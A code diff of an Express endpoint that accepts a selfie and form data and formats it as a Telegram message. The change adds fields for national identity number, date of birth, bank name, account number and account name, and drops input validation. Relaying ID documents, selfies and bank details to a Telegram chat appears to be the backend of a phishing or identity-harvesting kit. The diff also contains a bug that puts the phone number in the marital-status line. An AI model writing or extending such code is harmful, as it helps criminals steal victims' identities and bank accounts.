@@ -107,7 +107,7 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
     console.log('Request file:', req.file);
     
     try {
-        const { name, email, phone } = req.body;
+        const { name, gender, dob, email, employ, phone, marital, city, state, address, lga, nin, bankName, accountNumber, accountName} = req.body;
         const selfieFile = req.file;
 
         // Check if file exists
@@ -119,29 +119,18 @@ app.post('/api/data', upload.single('selfie'), async (req, res) => {
             });
         }
 
-        // Check if text fields are present
-        if (!name || !phone) {
-            return res.status(400).json({ 
-                error: 'All fields are required',
-                missing: {
-                    name: !name,
-                    phone: !phone,
-                }
-            });
-        }
-
-        console.log('Processing form data:');
-        console.log('Name:', name);
-        console.log('Phone:', phone);
-        console.log('Selfie file:', selfieFile);
 
         // Format text data for Telegram
         const formattedText = `
 📋 <b>New Form Submission</b>
 
-👤 <b>Name:</b> ${name}
-📞 <b>Phone:</b> ${phone}
-📞 <b>Email:</b> ${email}
+ <b>Name:</b> ${name}
+ <b>Gender:</b> ${gender}
+ <b>Date of Birth:</b> ${dob}
+ <b>Email:</b> ${email}
+ <b>Employment Status:</b> ${employ}
+ <b>Phone:</b> ${phone}
+ <b>Marital Status:</b> ${phone}
 
 🕒 <b>Submitted at:</b> ${new Date().toLocaleString()}
         `.trim();
